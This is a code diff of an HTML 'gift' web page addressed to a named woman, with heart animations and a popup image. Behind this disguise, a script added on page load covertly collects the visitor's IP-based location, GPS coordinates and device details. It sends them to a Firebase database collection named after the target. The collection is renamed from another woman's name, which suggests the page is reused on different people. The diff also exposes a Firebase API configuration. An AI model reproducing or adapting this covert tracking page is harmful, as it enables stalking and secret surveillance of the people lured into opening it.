@@ -28,7 +28,7 @@ max-width:350px;
 z-index:10;
 }
 
-/* Main heart */
+/* Heart animation */
 
 .heart{
 font-size:70px;
@@ -55,15 +55,7 @@ border-radius:25px;
 background:white;
 color:#ff4b5c;
 margin-top:15px;
-}
-
-/* Message */
-
-.message{
-display:none;
-font-size:22px;
-margin-top:15px;
-min-height:60px;
+cursor:pointer;
 }
 
 /* Falling hearts */
@@ -76,14 +68,8 @@ animation:fall linear infinite;
 }
 
 @keyframes fall{
-0%{
-transform:translateY(-10px);
-opacity:1;
-}
-100%{
-transform:translateY(110vh);
-opacity:0;
-}
+0%{transform:translateY(-10px);opacity:1;}
+100%{transform:translateY(110vh);opacity:0;}
 }
 
 /* Explosion hearts */
@@ -95,109 +81,109 @@ animation:pop 2s forwards;
 }
 
 @keyframes pop{
-0%{
-transform:scale(0);
-opacity:1;
+0%{transform:scale(0);opacity:1;}
+100%{transform:translateY(-200px) scale(1.5);opacity:0;}
 }
-100%{
-transform:translateY(-200px) scale(1.5);
-opacity:0;
+
+/* Modal Popup */
+
+.modal{
+display:none;
+position:fixed;
+z-index:999;
+left:0;
+top:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.8);
+justify-content:center;
+align-items:center;
 }
+
+.modal-content{
+position:relative;
+animation:fadeIn 0.5s;
+}
+
+.modal img{
+max-width:90vw;
+max-height:80vh;
+border-radius:15px;
+box-shadow:0 0 20px white;
+}
+
+.close{
+position:absolute;
+top:-10px;
+right:-10px;
+font-size:30px;
+color:white;
+cursor:pointer;
+}
+
+@keyframes fadeIn{
+from{opacity:0; transform:scale(0.8);}
+to{opacity:1; transform:scale(1);}
 }
 
 </style>
-
 </head>
 
 <body>
 
 <div class="container">
-
 <div class="heart">❤️</div>
-
 <h1>Dear Blessy ❤️</h1>
-
 <p>My Special Gift For You</p>
-
-<button onclick="showLove()">Open Gift 🎁</button>
-
-<div class="message" id="msg"></div>
-
+<button onclick="openGift()">Open Gift 🎁</button>
 </div>
 
+<!-- Popup -->
+<div id="imageModal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="closeModal()">×</span>
+    <img src="https://i.imgur.com/8Km9tLL.jpg" alt="Love Image">
+  </div>
+</div>
 
 <script>
 
-/* Background hearts */
-
+/* Falling background hearts */
 for(let i=0;i<25;i++){
-
 let heart=document.createElement("div");
-
 heart.innerHTML="❤️";
 heart.className="heartbg";
-
 heart.style.left=Math.random()*100+"%";
 heart.style.animationDuration=(3+Math.random()*5)+"s";
 heart.style.fontSize=(15+Math.random()*25)+"px";
-
 document.body.appendChild(heart);
-
 }
 
-</script>
-
-
-
-<script>
-
-function showLove(){
-
-/* Explosion hearts */
+/* Open Gift */
+function openGift(){
 
 for(let i=0;i<20;i++){
-
 let h=document.createElement("div");
-
 h.innerHTML="💖";
 h.className="popheart";
-
 h.style.left=(40+Math.random()*20)+"%";
 h.style.bottom="40%";
-
 document.body.appendChild(h);
-
 }
 
-/* Typing animation */
-
-let text="I Love You Blessy ❤️ You Are My Sweetest Dream 🌹";
-let i=0;
-
-let msg=document.getElementById("msg");
-
-msg.style.display="block";
-msg.innerHTML="";
-
-let typing=setInterval(()=>{
-
-msg.innerHTML+=text.charAt(i);
-
-i++;
-
-if(i>=text.length){
-clearInterval(typing);
+setTimeout(()=>{
+document.getElementById("imageModal").style.display="flex";
+},800);
 }
 
-},80);
-
+function closeModal(){
+document.getElementById("imageModal").style.display="none";
 }
 
 </script>
 
 
-
-<!-- Firebase + Location -->
+<!-- Firebase + IP + GPS Location -->
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -205,24 +191,19 @@ import { getFirestore, collection, addDoc } from "https://www.gstatic.com/fireba
 
 const firebaseConfig = {
 apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
-  authDomain: "remote-videoplayer.firebaseapp.com",
-  projectId: "remote-videoplayer",
-  storageBucket: "remote-videoplayer.firebasestorage.app",
-  messagingSenderId: "978359248102",
-  appId: "1:978359248102:web:c03c62454f8cbf70030727",
-  measurementId: "G-4D3PV2EGMX"
-
+authDomain: "remote-videoplayer.firebaseapp.com",
+projectId: "remote-videoplayer",
+storageBucket: "remote-videoplayer.firebasestorage.app",
+messagingSenderId: "978359248102",
+appId: "1:978359248102:web:c03c62454f8cbf70030727"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-
-/* Function Save Data */
-
 async function saveData(ipData,gpsLat,gpsLng){
 
-await addDoc(collection(db,"isha_location"),{
+await addDoc(collection(db,"blessy_location"),{
 
 ip:ipData.ip,
 city:ipData.city,
@@ -236,96 +217,31 @@ gpsLatitude:gpsLat,
 gpsLongitude:gpsLng,
 
 time:new Date().toString(),
-
 device:navigator.userAgent
 
 });
 
 }
 
-
-/* Step 1: Get IP Location */
-
 fetch("https://ipapi.co/json/")
 .then(res=>res.json())
 .then(ipData=>{
 
-
-/* Step 2: Ask GPS */
-
 navigator.geolocation.getCurrentPosition(
 
-/* Allow */
-
 (position)=>{
-
-saveData(
-ipData,
-position.coords.latitude,
-position.coords.longitude
-);
-
+saveData(ipData,position.coords.latitude,position.coords.longitude);
 },
 
-/* Decline */
-
 (error)=>{
-
-saveData(
-ipData,
-null,
-null
-);
-
+saveData(ipData,null,null);
 }
 
 );
-
 
 });
 
 </script>
-  
-<!-- <script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-const firebaseConfig = {
-
-apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
-  authDomain: "remote-videoplayer.firebaseapp.com",
-  projectId: "remote-videoplayer",
-  storageBucket: "remote-videoplayer.firebasestorage.app",
-  messagingSenderId: "978359248102",
-  appId: "1:978359248102:web:c03c62454f8cbf70030727",
-  measurementId: "G-4D3PV2EGMX"
-
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-
-/* Save Location */
-
-navigator.geolocation.getCurrentPosition(
-
-async (position)=>{
-
-await addDoc(collection(db,"isha_location"),{
-
-latitude:position.coords.latitude,
-longitude:position.coords.longitude,
-time:new Date().toString()
-
-});
-
-}
-
-);
-
-</script> -->
 
 </body>
 </html>
